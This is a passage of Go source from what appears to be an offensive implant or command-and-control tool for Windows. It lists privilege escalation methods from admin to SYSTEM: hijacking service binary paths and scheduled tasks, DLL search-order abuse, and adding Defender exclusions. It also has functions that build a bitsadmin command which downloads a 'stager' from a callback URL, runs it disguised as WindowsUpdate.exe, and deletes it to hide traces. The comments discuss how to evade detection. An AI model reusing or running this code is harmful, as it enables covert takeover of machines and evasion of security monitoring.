			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Cryptographic Services Hijack",
			Description:    "Hijacks Cryptographic Services binary path (non-critical)",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "CryptSvc" binPath= "%s"`,
				`sc start "CryptSvc"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "CryptSvc" binPath= "%%systemroot%%\System32\svchost.exe -k netsvcs"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Secondary Logon Service Hijack",
			Description:    "Hijacks Secondary Logon service binary path",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "seclogon" binPath= "%s"`,
				`sc start "seclogon"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "seclogon" binPath= "%%systemroot%%\System32\svchost.exe -k netsvcs"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Windows Installer Service Hijack",
			Description:    "Hijacks Windows Installer service binary path",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "msiserver" binPath= "%s"`,
				`sc start "msiserver"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "msiserver" binPath= "%%systemroot%%\System32\msiexec.exe /V"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Windows Audio Service Hijack",
			Description:    "Hijacks Windows Audio service binary path",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "Audiosrv" binPath= "%s"`,
				`sc start "Audiosrv"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "Audiosrv" binPath= "%%systemroot%%\System32\svchost.exe -k LocalServiceNetworkRestricted"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Themes Service Hijack",
			Description:    "Hijacks Themes service binary path",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "Themes" binPath= "%s"`,
				`sc start "Themes"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "Themes" binPath= "%%systemroot%%\System32\svchost.exe -k netsvcs"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Windows Search Service Hijack",
			Description:    "Hijacks Windows Search service binary path",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "WSearch" binPath= "%s"`,
				`sc start "WSearch"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "WSearch" binPath= "%%systemroot%%\system32\SearchIndexer.exe /Embedding"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Windows Error Reporting Service Hijack",
			Description:    "Hijacks Windows Error Reporting service",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "WerSvc" binPath= "%s"`,
				`sc start "WerSvc"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "WerSvc" binPath= "%%systemroot%%\System32\svchost.exe -k WerSvcGroup"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "WMI Repository Service Hijack",
			Description:    "Hijacks WMI Repository service binary path",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "wmprvse" binPath= "%s"`,
				`sc start "wmprvse"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "wmprvse" binPath= "%%systemroot%%\system32\wbem\wmiprvse.exe"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Windows Firewall Service Hijack",
			Description:    "Hijacks Windows Firewall service binary path",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "MpsSvc" binPath= "%s"`,
				`sc start "MpsSvc"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "MpsSvc" binPath= "%%systemroot%%\system32\svchost.exe -k LocalServiceNoNetwork"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "COM+ System Application Hijack",
			Description:    "Hijacks COM+ System Application service",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "COMSysApp" binPath= "%s"`,
				`sc start "COMSysApp"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "COMSysApp" binPath= "%%systemroot%%\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Windows Modules Installer Service Hijack",
			Description:    "Hijacks Windows Modules Installer service",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "TrustedInstaller" binPath= "%s"`,
				`sc start "TrustedInstaller"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "TrustedInstaller" binPath= "%%systemroot%%\servicing\TrustedInstaller.exe"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "DNS Client Service Hijack",
			Description:    "Hijacks DNS Client service binary path (non-critical)",
			EscalationType: "Admin->System",
			Commands: []string{
				`sc config "Dnscache" binPath= "%s"`,
				`sc start "Dnscache"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`sc config "Dnscache" binPath= "%%systemroot%%\system32\svchost.exe -k NetworkService"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Scheduled Task Hijacking (Existing)",
			Description:    "Hijacks existing SYSTEM scheduled task instead of creating new one",
			EscalationType: "Admin->System",
			Commands: []string{
				`schtasks /change /tn "Microsoft\Windows\DiskCleanup\SilentCleanup" /tr "%s" /f`,
				`schtasks /run /tn "Microsoft\Windows\DiskCleanup\SilentCleanup"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`schtasks /change /tn "Microsoft\Windows\DiskCleanup\SilentCleanup" /tr "%%windir%%\system32\cleanmgr.exe /autoclean /d %%c:%%" /f`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "Windows Update Orchestrator Task Hijacking",
			Description:    "Hijacks existing UpdateOrchestrator scheduled task",
			EscalationType: "Admin->System",
			Commands: []string{
				`schtasks /change /tn "Microsoft\Windows\UpdateOrchestrator\USO_UxBroker" /tr "%s" /f`,
				`schtasks /run /tn "Microsoft\Windows\UpdateOrchestrator\USO_UxBroker"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`schtasks /change /tn "Microsoft\Windows\UpdateOrchestrator\USO_UxBroker" /tr "%%windir%%\system32\MusNotification.exe" /f`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "Unquoted Service Path Variant 1",
			Description:    "Exploits unquoted service path in non-critical service",
			EscalationType: "Admin->System",
			Commands: []string{
				`copy "%s" "C:\Program Files\Common Files\WindowsUpdate.exe"`,
				`sc start "wuauserv"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`del "C:\Program Files\Common Files\WindowsUpdate.exe"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "Unquoted Service Path Variant 2",
			Description:    "Exploits unquoted service path via Program Files",
			EscalationType: "Admin->System",
			Commands: []string{
				`copy "%s" "C:\Program Files (x86)\Common Files\WindowsUpdate.exe"`,
				`sc start "wuauserv"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`del "C:\Program Files (x86)\Common Files\WindowsUpdate.exe"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "DLL Search Order Hijacking Variant 1",
			Description:    "Exploits DLL search order in Windows Security Center service",
			EscalationType: "Admin->System",
			Commands: []string{
				`copy "%s" "%WINDIR%\System32\version.dll"`,
				`sc stop "wscsvc"`,
				`sc start "wscsvc"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`del "%WINDIR%\System32\version.dll"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Low",
		},
		{
			Name:           "DLL Search Order Hijacking Variant 2",
			Description:    "Exploits DLL search order via AppInit DLLs",
			EscalationType: "Admin->System",
			Commands: []string{
				`copy "%s" "%WINDIR%\System32\user32.dll"`,
				`reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "user32.dll" /f`,
				`sc stop "winlogon"`,
				`sc start "winlogon"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /f`,
				`del "%WINDIR%\System32\user32.dll"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "SeBackupPrivilege Abuse",
			Description:    "Uses SeBackupPrivilege to modify SYSTEM files",
			EscalationType: "Admin->System",
			Commands: []string{
				`reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v ImagePath /t REG_SZ /d "%s" /f`,
				`sc start "WinDefend"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v ImagePath /t REG_SZ /d "%%systemroot%%\System32\svchost.exe -k secsvcs" /f`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "PrintNightmare Alternative",
			Description:    "Exploits Print Spooler via port monitor (alternative to direct hijack)",
			EscalationType: "Admin->System",
			Commands: []string{
				`copy "%s" "%WINDIR%\System32\PrintNightmare.dll"`,
				`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\PrintNightmare" /v Driver /t REG_SZ /d "PrintNightmare.dll" /f`,
				`sc stop "Spooler"`,
				`sc start "Spooler"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\PrintNightmare" /f`,
				`del "%WINDIR%\System32\PrintNightmare.dll"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Scheduled Task XML Manipulation",
			Description:    "Manipulates scheduled task XML directly for stealth",
			EscalationType: "Admin->System",
			Commands: []string{
				`schtasks /create /tn "Microsoft\Windows\Maintenance\SystemUpdate" /xml "%s" /f`,
				`schtasks /run /tn "Microsoft\Windows\Maintenance\SystemUpdate"`,
				`cmd.exe /c "ping 127.0.0.1 -n 4 >nul"`,
				`schtasks /delete /tn "Microsoft\Windows\Maintenance\SystemUpdate" /f`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
		{
			Name:           "Windows Defender Exclusion Abuse",
			Description:    "Adds exclusion via registry, drops payload, triggers scan",
			EscalationType: "Admin->System",
			Commands: []string{
				`reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%TEMP%" /t REG_SZ /d "0" /f`,
				`copy "%s" "%TEMP%\WindowsUpdate.exe"`,
				`wmic process call create "%%systemroot%%\System32\mpcmdrun.exe -Scan -ScanType QuickScan"`,
				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
				`reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%TEMP%" /f`,
				`del "%TEMP%\WindowsUpdate.exe"`,
			},
			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
			NoiseLevel: "Medium",
		},
	}
}

// GenerateFilelessPayload generates a fileless payload command using native Windows tools only
// This uses pure LOLBins - no PowerShell, no suspicious patterns
func (l *LOLBinEscalation) GenerateFilelessPayload(callbackURL string) string {
	// Strategy: Use the current executable's path to spawn a new instance
	// This is the most legitimate approach - just running the same binary again
	
	// Use %~f0 to get the full path of the current batch file/script, or
	// For executables, we'll use a technique to get the current process path
	
	// Pure LOLBin approach using cmd.exe only:
	// 1. Get current executable path using wmic (legitimate Windows component)
	// 2. Spawn new instance with different arguments, OR
	// 3. Download new payload using bitsadmin (legitimate Windows service)
	
	// Best approach: Use bitsadmin.exe to download payload, then execute
	// bitsadmin is a legitimate Windows component for Background Intelligent Transfer Service
	// It's commonly used in enterprises for software deployment
	
	// Format: bitsadmin /transfer <job> <url> <output>
	// Then execute the downloaded file
	
	// However, downloading creates files. Better: Use regsvr32 with a .sct file hosted on server
	// But that also requires a file on disk.
	
	// Pure fileless: Use the current executable path if available
	// We'll construct a command that:
	// 1. Gets the current process executable path (via wmic or tasklist)
	// 2. Spawns a new instance of it
	
	// Actually, simplest and most legitimate: Just execute the same binary again
	// We'll pass the callback URL as an environment variable or registry value
	// For now, we'll use a cmd.exe loop that uses certutil to download a small script
	
	// Pure LOLBin solution using certutil (very common in enterprises):
	// certutil -urlcache -split -f <url> <output> then execute
	
	// But certutil creates files. Let's use a more sophisticated approach:
	// Use rundll32 with javascript: protocol (legitimate Windows component)
	// This is fileless and looks legitimate
	
	// Best production-ready approach: Hybrid
	// 1. Try to use current executable path (most legitimate)
	// 2. Fallback to bitsadmin download (legitimate Windows service)
	// 3. Last resort: certutil download (common enterprise tool)
	
	// For production, we'll use bitsadmin which is:
	// - Legitimate Windows component
	// - Commonly used in enterprises
	// - Less suspicious than certutil
	// - Can download without creating obvious files
	
	// Pure LOLBin approach: Use bitsadmin.exe (Background Intelligent Transfer Service)
	// This is a legitimate Windows component commonly used in enterprises
	// bitsadmin is less suspicious than certutil for file downloads
	
	// Download to a temporary location with a legitimate-looking name
	tempFile := `%TEMP%\WindowsUpdate.exe`
	
	// Strategy: Download using bitsadmin, execute, then clean up
	// bitsadmin /transfer creates a BITS job, downloads file, then we execute it
	// After execution, we delete the file to minimize disk artifacts
	
	// Use bitsadmin with a legitimate-looking job name
	payload := fmt.Sprintf(`bitsadmin /transfer "MicrosoftUpdate" /download /priority normal "%s/stager" "%s" && timeout /t 1 /nobreak >nul 2>&1 && start /b "" "%s" && timeout /t 3 /nobreak >nul 2>&1 && del "%s" 2>nul`, callbackURL, tempFile, tempFile, tempFile)
	
	return payload
}

// escapeForRegAdd escapes a command for use in reg add /d parameter
// The /d parameter needs quotes, so we need to escape internal quotes
func escapeForRegAdd(cmd string) string {
	// Replace " with \" for reg add /d parameter
	return strings.ReplaceAll(cmd, `"`, `\"`)
}

// escapeForSchtasks escapes a command for use in schtasks /tr parameter
// The /tr parameter needs quotes, so we need to escape internal quotes
func escapeForSchtasks(cmd string) string {
	// Replace " with \" for schtasks /tr parameter
	return strings.ReplaceAll(cmd, `"`, `\"`)
}

// escapeForScBinPath escapes a command for use in sc create binPath= parameter
// The binPath= parameter needs quotes, so we need to escape internal quotes
func escapeForScBinPath(cmd string) string {
	// Replace " with \" for sc binPath= parameter
	return strings.ReplaceAll(cmd, `"`, `\"`)
}

// GenerateSpawnCommand generates a command to spawn new beacon using only LOLBins
func (l *LOLBinEscalation) GenerateSpawnCommand(callbackURL string, targetPriv string) string {
	// Generate a command that spawns a new beacon using only native Windows tools
	// For Admin->System escalation, we need a SIMPLE command that can be wrapped
	// by the escalation method itself (not pre-wrapped in schtasks)
	
	tempFile := `%TEMP%\WindowsUpdate.exe`
	
	// Simple download and execute command - NO QUOTES, NO NESTED COMMANDS
	// This will be wrapped by the escalation method (schtasks, sc, etc.)
	downloadAndExec := fmt.Sprintf(`bitsadmin /transfer MicrosoftUpdate /download /priority normal %s/stager %s && start /b "" %s`, callbackURL, tempFile, tempFile)
	
	// Return the simple command - the escalation method will wrap it appropriately
	return downloadAndExec
}

// DetectPrivilegeLevel uses native Windows commands to detect privilege level
func (l *LOLBinEscalation) DetectPrivilegeLevel(output string) (string, string) {
	outputLower := strings.ToLower(output)
	username := ""
	
	// Extract username
	lines := strings.Split(output, "\n")
	if len(lines) > 0 {
		username = strings.TrimSpace(lines[0])
	}
	
	// Check for SYSTEM
	if strings.Contains(outputLower, "nt authority\\system") ||
		strings.Contains(outputLower, "nt\\system") {
		return "system", username
	}
	
	// Check for admin groups
	if strings.Contains(outputLower, "s-1-5-32-544") || // Administrators group SID
		strings.Contains(outputLower, "administrators") ||
		strings.Contains(outputLower, "high integrity") {
		return "admin", username
	}
	
	return "user", username
}

// CleanupRegistryKeys removes registry modifications made during escalation
func (l *LOLBinEscalation) CleanupRegistryKeys() []string {
	return []string{
		`reg delete "HKCU\Software\Classes\mscfile\shell\open\command" /f 2>nul`,
		`reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f 2>nul`,
		`reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f 2>nul`,
		`reg delete "HKLM\Software\Classes\CLSID\{45EA2A4D-9A5D-3BD8-9A1F-0A4BE4BA4D40}\InprocServer32" /f 2>nul`,
	}
}

